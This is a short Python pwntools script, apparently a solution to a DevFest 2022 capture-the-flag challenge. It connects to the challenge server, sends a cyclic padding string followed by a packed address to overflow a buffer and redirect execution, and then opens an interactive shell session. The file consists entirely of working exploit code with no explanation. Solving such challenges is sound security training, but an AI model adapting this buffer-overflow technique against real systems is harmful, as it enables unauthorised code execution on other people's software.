#! /usr/bin/python3
from pwn import *

HOST = 'devfest22-cybersec.gdgalgiers.com'
PORT = 1400

p = remote(HOST, PORT)

p.sendlineafter(b'Enter your input: ', b'aaaabaaacaaadaaaeaaafaaagaaahaaa\x99\x11\x00\x00\x00\x00\x00\x00')
p.interactive()